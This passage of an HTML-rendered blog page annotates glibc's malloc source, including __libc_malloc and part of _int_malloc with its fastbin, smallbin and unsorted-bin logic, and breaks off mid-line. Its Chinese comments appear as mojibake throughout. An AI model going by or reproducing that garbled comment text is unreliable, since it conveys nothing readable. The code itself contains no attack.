class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br><span class="hljs-comment">//å®šä¹‰äº†ä¸€ä¸ªæŒ‡å‘arenaçš„æŒ‡é’ˆï¼Œç”¨äºå†…å­˜åˆ†é…</span><br>  mstate ar_ptr;<br><br><span class="hljs-comment">//ç”¨äºå­˜å‚¨æœ€ç»ˆè¿”å›çš„åˆ†é…å†…å­˜åœ°å€</span><br>  <span class="hljs-type">void</span> *victim;<br><br><span class="hljs-comment">//æ£€æŸ¥è‡ªå®šä¹‰mallocé’©å­</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><br><span class="hljs-comment">//è·å–æœ¬çº¿ç¨‹å¯¹åº”çš„arenaï¼Œå³malloc_stateç»“æ„ä½“</span><br>  arena_get (ar_ptr, bytes);<br><br><span class="hljs-comment">//è°ƒç”¨_int_mallocç”³è¯·å†…å­˜</span><br><span class="hljs-comment">//å‚æ•°ar_ptræŒ‡å‘arenaï¼Œå‚æ•°bytesä¸ºç”³è¯·çš„å­—èŠ‚æ•°</span><br>  victim = _int_malloc (ar_ptr, bytes);<br><br><span class="hljs-comment">//è‹¥åœ¨å½“å‰arenaä¸­åˆ†é…å¤±è´¥ï¼Œä¸”ar_ptréç©ºï¼Œä¼šè°ƒç”¨arena_get_retryè·å–å…¶ä»–arenaè¿›è¡Œé‡è¯•ã€‚</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br><span class="hljs-comment">//åœ¨å®Œæˆåˆ†é…æˆ–å¤±è´¥åï¼Œé‡Šæ”¾è¯¥arenaçš„äº’æ–¥é”ï¼Œç¡®ä¿å…¶å®ƒçº¿ç¨‹å¯ä»¥è®¿é—®æ­¤arena</span><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br><span class="hljs-comment">//é€šè¿‡æ¡ä»¶éªŒè¯åˆ†é…ï¼Œä¸æ»¡è¶³åˆ™ç›´æ¥å´©æºƒ</span><br><span class="hljs-comment">//1.æ˜¯å¦æ²¡æœ‰ç”³è¯·æˆåŠŸå†…å­˜è¿”å›æ˜¯ç©º</span><br><span class="hljs-comment">//2.è¯¥chunkæ˜¯å¦æ˜¯é€šè¿‡mmapåˆ†é…çš„å†…å­˜å—</span><br><span class="hljs-comment">//3.åˆ¤æ–­areanæŒ‡é’ˆå’Œmainarenaæ˜¯å¦åŒ¹é…</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-comment">//è¿”å›ç”³è¯·åˆ°çš„å†…å­˜</span><br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a><code>_int_malloc</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* è¯·æ±‚çš„chunk_size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* å¯¹åº”binæ•°ç»„ä¸­çš„index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* æŒ‡å‘å¯¹åº”binçš„æŒ‡é’ˆ */</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* æŒ‡å‘åˆ†é…çš„chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* åˆ†é…çš„chunkçš„size */</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* åˆ†é…çš„chunkçš„binçš„index */</span><br><br>  mchunkptr remainder;              <span class="hljs-comment">/* æŒ‡å‘åˆ†å‰²åå‰©ä¸‹çš„é‚£å—chunk */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* åˆ†å‰²åå‰©ä¸‹çš„é‚£å—chunkçš„size */</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverse */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* ä¸€ä¸ªblockå€¼ */</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* ç”¨äºé“¾è¡¨æ“ä½œ */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* ç”¨äºé“¾è¡¨æ“ä½œ */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;        <span class="hljs-comment">//æŠ¥é”™å­—ç¬¦ä¸²æŒ‡é’ˆ</span><br><br>  checked_request2size (bytes, nb); <span class="hljs-comment">//å°†ç”³è¯·å†…å­˜çš„å­—èŠ‚æ•°è½¬æ¢ä¸ºåˆé€‚çš„chunk sizeå­˜å…¥nb</span><br><br><span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æœ‰å¯ç”¨çš„arena</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>  <span class="hljs-comment">//æ— å¯ç”¨çš„arenaï¼Œä½¿ç”¨sysmallocè·å–å†…å­˜</span><br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>      <span class="hljs-comment">//å†…å­˜åˆ†é…æˆåŠŸåˆ™å¯¹å†…å­˜è¿›è¡Œæ‰°åŠ¨å¤„ç†ï¼Œå³å¡«å……å†…å­˜ç‰¹å®šå­—èŠ‚</span><br>alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br> <span class="hljs-comment">//è¦åˆ†é…çš„chunk sizeå°äºç­‰äºglobal_max_faståˆ™å…ˆä»fastbinä¸­å¯»æ‰¾</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<span class="hljs-comment">//get_max_fastç”¨äºè·å–global_max_fast</span><br>    &#123;<br>  <span class="hljs-comment">//é€šè¿‡sizeè®¡ç®—å…¶åœ¨fastbinä¸­å¯¹åº”çš„ç´¢å¼•ç„¶åå­˜å…¥idx</span><br>      idx = fastbin_index (nb);<br>      <span class="hljs-comment">//é€šè¿‡idxè·å–arenaçš„fastbinä¸­å¯¹åº”çš„bin</span><br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      <span class="hljs-comment">//è·å–binçš„é¦–ä¸ªchunk</span><br>      mchunkptr pp = *fb;<br><br><span class="hljs-comment">//è¿™æ®µä»£ç åœ¨å¹¶å‘ç¯å¢ƒä¸‹ï¼Œé€šè¿‡å¾ªç¯å’ŒåŸå­æ“ä½œå®‰å…¨åœ°ä»è‡ªç”±é“¾è¡¨ä¸­å–å‡ºä¸€ä¸ªç©ºé—²å—ã€‚å®ƒä½¿ç”¨ catomic_compare_and_exchange_val_acq æ¥ç¡®ä¿æ— é”è®¿é—®çš„åŸå­æ€§ï¼Œä½¿å¾—å¤šä¸ªçº¿ç¨‹èƒ½å¤ŸåŒæ—¶æ“ä½œåŒä¸€ä¸ªè‡ªç”±é“¾è¡¨è€Œä¸ä¼šå‡ºç°æ•°æ®ç«äº‰ã€‚</span><br>      <span class="hljs-keyword">do</span><br>        &#123;<span class="hljs-comment">//å°†å½“å‰é“¾è¡¨çš„å¤´èŠ‚ç‚¹èµ‹å€¼ç»™victim</span><br>          victim = pp;<br>          <span class="hljs-comment">//å¦‚æœé“¾è¡¨ä¸ºç©ºè·³å‡ºå¾ªç¯</span><br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//ä½¿ç”¨CASæ“ä½œç¡®ä¿çº¿ç¨‹å®‰å…¨ï¼Œå¦‚æœfastbinçš„å¤´æŒ‡é’ˆæœªè¢«å…¶å®ƒçº¿ç¨‹ä¿®æ”¹ï¼Œå°†ä¸‹ä¸€ä¸ªå—çš„åœ°å€è®¾ç½®ä¸ºé“¾è¡¨æ–°çš„å¤´èŠ‚ç‚¹</span><br>      <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>             != victim);<br><br><br>      <span class="hljs-comment">//æ­¤æ—¶victimæ˜¯è¯¥fbåŸæ¥çš„é¦–ä¸ªchunkï¼Œæˆ–è€…ä¸º0</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-comment">//å¦‚æœvictimçš„å¤§å°ä¸ç¬¦åˆå½“å‰fastbinçš„è¦æ±‚ï¼Œåˆ™è¿›è¡Œé”™è¯¯å¤„ç†</span><br>          <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>            &#123;<br>            <span class="hljs-comment">//é”™è¯¯å¤„ç†</span><br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          <span class="hljs-comment">//æ£€æŸ¥victimå—æ˜¯å¦è¢«é‡å¤åˆ†é…æˆ–è¢«ä¿®æ”¹ï¼Œç¡®ä¿å†…å­˜å®‰å…¨æ€§ã€‚</span><br>          check_remalloced_chunk (av, victim, nb);<br>          <span class="hljs-comment">//å°†chunkå—æŒ‡é’ˆè½¬æ¢ä¸ºuser dataçš„æŒ‡é’ˆã€‚</span><br><span class="hljs-comment">//#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          <span class="hljs-comment">//ç”¨äºåˆå§‹åŒ–å†…å­˜å—pï¼Œå°†å…¶ä¸­çš„æ•°æ®ç”¨å›ºå®šå­—èŠ‚å¡«å……ã€‚</span><br>          alloc_perturb (p, bytes);<br>          <span class="hljs-comment">//å°†åˆ†é…å‡ºæ¥çš„å†…å­˜æŒ‡é’ˆè¿”å›</span><br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//å¦‚æœå‰é¢åœ¨fastbinä¸­æ²¡æœ‰æ‰¾åˆ°å°±ä¼šä»smallbinä¸­æŸ¥æ‰¾</span><br><span class="hljs-comment">//å¦‚æœsizeå°äºlargebinä¸­æœ€å°çš„sizeé‚£ä¹ˆå°±ä»smallbinä¸­æŸ¥æ‰¾</span><br><span class="hljs-comment">/*#define in_smallbin_range(sz)  \</span><br><span class="hljs-comment">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)*/</span><br><br><span class="hljs-comment">//#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-comment">//#define NSMALLBINS         64  </span><br><span class="hljs-comment">//#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT  </span><br><span class="hljs-comment">//#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-comment">//MALLOC_ALIGNMENT (2 *SIZE_SZ)ï¼Œ32ä½ä¸º8å­—èŠ‚ï¼Œ64ä½ä¸º16å­—èŠ‚</span><br><span class="hljs-comment">//min_large_sizeä¸º0x400</span><br><br>  <span class="hljs-comment">//è¯¥å®è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œå¦‚æœszå°äºmin_large_sizeï¼Œåˆ™è¿”å›true</span><br>  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>    <br><span class="hljs-comment">/*smallbin_index(sz)</span><br><span class="hljs-comment">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))</span><br><span class="hljs-comment">  + SMALLBIN_CORRECTION)*/</span><br><br>  <span class="hljs-comment">//æ ¹æ®sizeæ‰¾åˆ°ç›¸åº”åœ¨smallbinä¸­çš„ä¸‹æ ‡</span><br>      idx = smallbin_index (nb);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">bin_at(m, i)</span><br><span class="hljs-comment">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))</span><br><span class="hljs-comment">  - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-comment">//m-&gt;binsï¼Œè·å–binsæ•°ç»„</span><br> <span class="hljs-comment">//((i)-1)*2ï¼Œç´¢å¼•iè¡¨ç¤ºbinçš„ç¼–å·</span><br> <span class="hljs-comment">//&amp;((m)-&gt;bins[((i)-1)*2]ï¼Œè®¡ç®—å‡ºç›®æ ‡binåœ¨binsæ•°ç»„ä¸­çš„åœ°å€</span><br><span class="hljs-comment">//#define offsetof(TYPE, MEMBER) __builtin_offsetof (TYPE, MEMBER)</span><br><span class="hljs-comment">//offsetofå®è®¡ç®—fdæˆå‘˜åœ¨malloc_chunkä¸­çš„åç§»é‡</span><br><span class="hljs-comment">//ä»binsçš„åœ°å€å‡å»fdçš„åç§»é‡ï¼Œå¾—åˆ°ä¸€ä¸ªå®Œæ•´çš„chunkç»“æ„çš„åŸºåœ°å€</span><br><br>      <span class="hljs-comment">//æ ¹æ®ä¸‹æ ‡å°†è¿™ä¸ªbinå–å‡ºæ¥</span><br>      bin = bin_at (av, idx);<br><br><span class="hljs-comment">//last(b) ((b)-&gt;bk</span><br>  <span class="hljs-comment">//lastè·å–å½“å‰bkæŒ‡å‘çš„å€¼ï¼Œå¦‚æœä¸ç­‰äºbinåˆ™smallbinä¸ä¸ºç©º</span><br>  <span class="hljs-comment">//ä¸€èˆ¬å‘binä¸­å–å‡ºå—ç”¨bkï¼Œæ·»åŠ å—ç”¨fd</span><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <br>          <br>            <span class="hljs-comment">//victimä¸º0ï¼Œè¡¨ç¤ºsmallbinè¿˜æ²¡æœ‰åˆå§‹åŒ–ä¸ºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œè°ƒç”¨malloc_consolidateå‡½æ•°ï¼Œæ­¤æ—¶ç”±äºglobal_max_fastä¹Ÿæœªåˆå§‹åŒ–ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨malloc_init_stateåˆå§‹åŒ–</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br>    <span class="hljs-comment">//åŒå‘é“¾è¡¨æ£€æµ‹ï¼Œlast(bin)-&gt;bk-&gt;fd == last(bin)</span><br>    <span class="hljs-comment">//æ£€æŸ¥ä¸‹ä¸€ä¸ªchunkçš„bkæŒ‡å‘çš„ä¸Šä¸€ä¸ªchunkæ˜¯å¦æŒ‡å‘bin</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  <br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>          <span class="hljs-comment">//è®¾ç½®inuseæ ‡å¿—</span><br>              set_inuse_bit_at_offset (victim, nb);<br>              <span class="hljs-comment">//å°†victimä»smallbinçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­å–å‡º</span><br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>  <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦æŒ‡å‘main_arena</span><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>            <span class="hljs-comment">//å¦‚æœä¸æŒ‡å‘ï¼Œåˆ™å°†non_main_arenaç½®ä¸º1</span><br>                victim-&gt;size |= NON_MAIN_ARENA;<br>          <span class="hljs-comment">//æ£€æŸ¥victimæ‰€æŒ‡å‘çš„å·²åˆ†é…å†…å­˜å—çš„å®Œæ•´æ€§å’Œåˆæ³•æ€§ï¼Œç¡®ä¿åˆ†é…çš„å†…å­˜å—ç¬¦åˆé¢„æœŸçš„å¤§å°å’Œå¯¹é½è¦æ±‚</span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-comment">//å°†æŒ‡å‘chunkå¤´éƒ¨çš„æŒ‡é’ˆæŒ‡å‘user data</span><br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              <span class="hljs-comment">//ç”¨äºå°†åˆ†é…çš„å†…å­˜åŒºåŸŸå¡«å……ç‰¹å®šæ¨¡å¼çš„æ•°æ®ï¼Œä»¥ä¾¿åœ¨è°ƒè¯•å’Œè¯Šæ–­ä¸­å¸®åŠ©æ£€æµ‹æœªåˆå§‹åŒ–å†…å­˜ä½¿ç”¨ç­‰é—®é¢˜</span><br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">//å¦‚æœsmallbinæ²¡æœ‰å°±ä»largebinå–</span><br>      idx = largebin_index (nb);<br>      <span class="hljs-comment">//å…ˆæŸ¥çœ‹æ˜¯å¦å­˜åœ¨fastbin</span><br>      <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>        malloc_consolidate (av);<br>    &#125;<br><br><br>  <span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>          <br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>            &#123;<br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != 